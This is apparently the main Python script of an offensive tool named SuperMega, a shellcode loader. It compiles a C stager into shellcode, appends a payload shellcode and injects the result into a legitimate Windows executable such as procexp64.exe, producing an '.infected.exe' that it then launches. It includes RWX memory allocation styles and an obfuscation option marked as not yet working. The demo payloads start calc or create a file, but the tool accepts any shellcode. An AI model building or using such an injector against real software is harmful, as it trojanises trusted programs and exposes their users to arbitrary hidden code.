import shutil
from enum import Enum
from helper import *
import argparse


class AllocStyle(Enum):
    RWX = 1
    RW_X = 2
    REUSE = 3

class ExecStyle(Enum):
    CALL = 1,
    JMP = 2,
    FIBER = 3,

class CopyStyle(Enum):
    SIMPLE = 1

class DataRefStyle(Enum):
    APPEND = 1


options_default = {
    "payload": "shellcodes/calc64.bin",
    "verify": False,

    # configuration
    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND,

    "try_start_loader_shellcode": False,  # without payload (Debugging)
    "try_start_final_shellcode": True,    # with payload (should work)
    "try_start_final_infected_exe": True, # with payload (should work)

    # cleanup
    "cleanup_files_on_start": True,
    "cleanup_files_on_exit": True,

    # For debugging: Can disable some steps
    "generate_asm_from_c": True,
    "generate_shc_from_asm": True,

    # Not working atm
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
}


# VERIFY
# This will verify if our loader works
# - Use it on a "target" machine
# - payload shellcode will create a file c:\temp\a
# - set: verify=True
options_verify = {
    "payload": "shellcodes/createfile.bin",
    "verify": True,

    # configuration
    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND,

    # testing
    "try_start_loader_shellcode": False,  # without payload (Debugging)
    "try_start_final_shellcode": False,   # with payload (should work)

    # injecting into exe
    "inject_exe": True,
    "inject_exe_in": "exes/procexp64.exe",
    "inject_exe_out": "out/procexp64-a.exe",

    # For debugging: Can disable some steps
    "generate_asm_from_c": True,
    "generate_shc_from_asm": True,
    
    # cleanup
    "cleanup_files_on_start": True,
    "cleanup_files_on_exit": True, # all is just in out/

    # doesnt work
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
}

options = None

main_c_file = os.path.join(build_dir, "main.c")
main_asm_file = os.path.join(build_dir, "main.asm")
main_exe_file = os.path.join(build_dir, "main.exe")
main_shc_file = os.path.join(build_dir, "main.bin")

debug_data = {
    "loader_shellcode": b"",
    "payload_shellcode": b"",
    "final_shellcode": b"",

    "asm_initial": "",
    "asm_cleanup": "",
    "asm_fixup": "",

    "original_exe": b"",
    "infected_exe": b"",
}


def main():
    print("Super Mega")

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--verify', action='store_true', help='Debug: Perform verification')
    args = parser.parse_args()

    if args.verify:
        options = options_verify
    else:
        options = options_default
        if args.shellcode:
            if not os.path.isfile(args.shellcode):
                print("Could not find: {}".format(args.shellcode))
                return
            options["payload"] = args.shellcode
        if args.inject:
            if not os.path.isfile(args.inject):
                print("Could not find: {}".format(args.inject))
                return
            options["inject_exe"] = True
            options["inject_exe_in"] = args.inject
            options["inject_exe_out"] = args.inject.replace(".exe", ".infected.exe")


    if options["cleanup_files_on_start"]:
        clean_files()

    shutil.copy("source/main.c", "build/main.c")
    shutil.copy("source/peb_lookup.h", "build/peb_lookup.h")

    if options["generate_asm_from_c"]:
        with open(options["payload"], 'rb') as input2:
            data_payload = input2.read()
            l = len(data_payload)
            debug_data["payload_shellcode"] = data_payload
        asm = make_c_to_asm(main_c_file, main_asm_file, l)
        debug_data["asm_initial"] = asm["initial"]
        debug_data["asm_cleanup"] = asm["cleanup"]
        debug_data["asm_fixup"] = asm["fixup"]

    if options["generate_asm_from_c"]:
        code = make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
        debug_data["loader_shellcode"] = code
    
    if options["try_start_loader_shellcode"]:
        try_start_shellcode(main_shc_file)

    # SGN seems buggy atm
    #if options["obfuscate_shc_loader"]:
    #    obfuscate_shc_loader("main-clean.bin", "main-clean.bin")
    #
    #    if options["verify"]:
    #        if not verify_shellcode("main-clean.bin"):
    #            return

    if options["dataref_style"] == DataRefStyle.APPEND:
        print("--[ Merge stager: {} + {} -> {} ] ".format(main_shc_file, options["payload"], main_shc_file))
        with open(main_shc_file, 'rb') as input1:
            data_stager = input1.read()

        with open(options["payload"], 'rb') as input2:
            data_payload = input2.read()

        print("---[ Size: Stager: {} and Payload: {}  Sum: {} ]".format(
            len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))

        with open(main_shc_file, 'wb') as output:
            data = data_stager + data_payload
            output.write(data)
            debug_data["final_shellcode"] = data

        if options["verify"]:
            print("--[ Verify final shellcode ]")
            if not verify_shellcode(main_shc_file):
                return

        if options["try_start_final_shellcode"]:
            print("--[ Test Append shellcode ]")
            try_start_shellcode(main_shc_file)

        # copy it to out
        shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))

    if options["inject_exe"]:
        debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])

        inject_exe(main_shc_file, options["inject_exe_in"], options["inject_exe_out"])
        if options["verify"]:
            print("--[ Verify final exe ]")
            if verify_injected_exe(options["inject_exe_out"]):
                debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])

        if options["try_start_final_infected_exe"]:
            print("--[ Start infected exe ]")
            subprocess.run([
                options["inject_exe_out"],
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if options["cleanup_files_on_exit"]:
        clean_files()


if __name__ == "__main__":
    main()

